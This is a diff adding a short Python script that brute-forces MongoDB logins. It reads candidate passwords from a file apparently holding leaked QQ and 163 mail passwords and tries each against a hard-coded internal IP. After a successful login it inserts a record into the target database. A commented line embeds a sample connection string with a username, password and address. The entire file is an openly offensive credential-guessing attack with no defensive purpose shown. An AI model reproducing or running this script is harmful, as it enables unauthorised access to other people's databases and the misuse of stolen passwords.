@@ -1,0 +1,28 @@
+import  pymongo
+import time
+def   crackMongoDB(user,password,ip,port):
+    try:
+        #"mongodb://yinchengak:11111111a@10.36.132.179:27017
+        url="mongodb://"+user+":"+password+"@"+ip+":"+port
+        client=pymongo.MongoClient(url)
+        db=client.mydb  #mydb是一个数据库名字没有回自动创建
+        myset=db.myset #myset是一个集合名字没有回自动创建
+        myset.insert({"name":"huangjian"})
+        return True
+    except:
+        return False
+passfilepath=r"D:\qqAnd163Password.txt"
+passfile=open(passfilepath,"rb")
+while True:
+    line=passfile.readline()
+    if not line:
+        break
+    line=line.decode("utf-8","ignore") #读取二进制
+    linelist=line.split(" # ")#切割
+    password=linelist[0] #抓取密码
+    isok= crackMongoDB("yourname",password,"10.36.132.111","27017")
+    print(password,isok)
+    if isok:
+        break
+passfile.close()
+
